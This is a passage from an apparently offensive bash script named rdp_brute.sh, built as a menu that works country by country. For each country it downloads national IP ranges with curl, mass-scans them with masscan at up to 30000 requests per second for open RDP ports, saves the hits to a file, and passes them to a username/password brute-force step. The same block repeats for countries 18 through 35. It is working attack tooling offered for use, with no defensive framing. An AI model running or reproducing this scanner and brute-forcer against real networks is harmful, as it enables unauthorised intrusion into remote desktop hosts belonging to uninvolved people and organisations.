trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "18" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BARBADOS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Barbados://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "19" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELARUS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belarus://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "20" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELGIUM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belgium://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "21" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BELIZE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Belize://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "22" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BENIN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Benin://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "23" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BERMUDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bermuda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "24" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BHUTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bhutan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "25" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOLIVIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bolivia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "26" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOSNIA+AND+HERZEGOWINA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bosnia and Herzegowina://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "27" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BOTSWANA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Botswana://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "28" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRAZIL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Brazil://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "29" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRITISH+INDIAN+OCEAN+TERRITORY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/British Indian Ocean Territory://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "30" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BRUNEI+DARUSSALAM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Brunei Darussalam://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "31" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BULGARIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Bulgaria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "32" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BURKINA+FASO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Burkina Faso://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "33" ]; then
curl http://services.ce3c.be/ciprg/?countrys=BURUNDI |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Burundi://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "34" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAMBODIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cambodia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "35" ]; then
curl http://services.ce3c.be/ciprg/?countrys=CAMEROON |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Cameroon://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
